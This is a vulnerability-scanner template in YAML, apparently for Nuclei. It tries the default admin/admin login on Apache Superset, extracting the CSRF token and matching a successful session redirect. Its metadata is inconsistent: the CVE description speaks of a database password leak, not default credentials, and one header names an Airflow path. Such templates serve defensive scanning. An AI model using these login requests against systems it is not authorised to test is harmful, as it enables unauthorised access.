id: CVE-2021-44451
info:
  author: dhiyaneshDK
  classification:
    cve-id: CVE-2021-44451
  description: Apache Superset up to and including 1.3.2 allowed for registered database
    connections password leak for authenticated users. This information could be accessed
    in a non-trivial way.
  name: Apache Superset Default Login
  reference:
  - https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/apache-superset-default-credentials.json
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44451
  remediation: Users should upgrade to Apache Superset 1.4.0 or higher.
  severity: high
  tags: apache, default-login
requests:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: csrf_token
    part: body
    regex:
    - value="(.*?)">
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <title>Redirecting...</title>
    - <h1>Redirecting...</h1
    - <a href="/">
  - part: header
    type: word
    words:
    - session
  - status:
    - 302
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'GET /login/ HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    '
  - 'POST /login/ HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}/admin/airflow/login


    csrf_token={{csrf_token}}&username={{username}}&password={{password}}

    '
